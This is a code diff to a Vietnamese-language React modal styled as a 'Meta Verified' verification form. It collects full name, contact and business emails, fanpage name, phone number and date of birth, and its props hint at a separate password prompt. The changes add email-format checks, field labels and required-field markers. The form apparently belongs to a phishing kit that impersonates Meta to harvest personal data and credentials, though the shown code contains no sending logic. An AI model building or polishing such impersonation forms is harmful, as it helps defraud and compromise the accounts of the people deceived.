@@ -12,6 +12,7 @@ interface InfomationsModalProps {
 }
 
 const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
   const [isOpen, setIsOpen] = React.useState(isOpend);
   const [errors, setErrors] = React.useState<Record<string, string>>({});
@@ -39,8 +40,16 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
 
       const newErrors: Record<string, string> = {};
       if (!formData.fullName.trim()) newErrors.fullName = "Vui lòng nhập họ và tên đầy đủ.";
-      if (!formData.email.trim()) newErrors.email = "Vui lòng nhập địa chỉ email liên hệ.";
-      if (!formData.emailBusiness.trim()) newErrors.emailBusiness = "Vui lòng nhập email doanh nghiệp hợp lệ.";
+      if (!formData.email.trim()) {
+        newErrors.email = "Vui lòng nhập địa chỉ email liên hệ.";
+      } else if (!emailRegex.test(formData.email.trim())) {
+        newErrors.email = "Email liên hệ không đúng định dạng (ví dụ: name@domain.com).";
+      }
+      if (!formData.emailBusiness.trim()) {
+        newErrors.emailBusiness = "Vui lòng nhập email doanh nghiệp hợp lệ.";
+      } else if (!emailRegex.test(formData.emailBusiness.trim())) {
+        newErrors.emailBusiness = "Email doanh nghiệp không đúng định dạng (ví dụ: name@domain.com).";
+      }
       if (!formData.fanpage.trim()) newErrors.fanpage = "Vui lòng nhập tên Trang/Fanpage.";
       if (!formData.phone.trim()) newErrors.phone = "Vui lòng nhập số điện thoại.";
       if (!formData.day) newErrors.day = "Vui lòng chọn ngày sinh.";
@@ -87,6 +96,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                 Vui lòng cung cấp thông tin chính xác để hoàn tất hồ sơ xác minh Meta Verified. Các trường bắt buộc cần được điền đầy đủ để tránh gián đoạn quá trình xét duyệt.
               </p>
             </div>
+            <label htmlFor='fullName' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Họ và tên người đại diện <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('fullName')}>
               <input
                 type="text"
@@ -99,9 +109,10 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fullName')}
 
+            <label htmlFor='email' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Email liên hệ <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('email')}>
               <input
-                type="text"
+                type="email"
                 id='email'
                 placeholder={"Email liên hệ"}
                 className="w-full outline-0 h-full tracking-wide"
@@ -111,9 +122,10 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('email')}
 
+            <label htmlFor='emailBusiness' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Email doanh nghiệp <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('emailBusiness')}>
               <input
-                type="text"
+                type="email"
                 id='emailBusiness'
                 placeholder={"Email doanh nghiệp"}
                 className="w-full outline-0 h-full tracking-wide"
@@ -123,6 +135,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('emailBusiness')}
 
+            <label htmlFor='fanpage' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Tên Trang/Fanpage <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('fanpage')}>
               <input
                 type="text"
@@ -135,6 +148,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fanpage')}
 
+            <label className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Số điện thoại <span className='text-[#e5484d]'>*</span></label>
             <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
               <PhoneInput
                 country={formData.country_code?.toLowerCase() || "us"}
@@ -151,7 +165,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             {errorText('phone')}
 
             <div>
-              <b className='text-[#5c6982] text-[14px] mb-[7px]'>Ngày tháng năm sinh</b>
+              <b className='text-[#3b4a64] text-[13px] font-semibold mb-[7px] block'>Ngày tháng năm sinh <span className='text-[#e5484d]'>*</span></b>
             </div>
             <div className="grid grid-cols-3 gap-[10px]">
               <div>
@@ -207,6 +221,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
 
             </div>
 
+            <label htmlFor='message' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>Ghi chú bổ sung (tùy chọn)</label>
             <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
               <textarea
                 id='message'
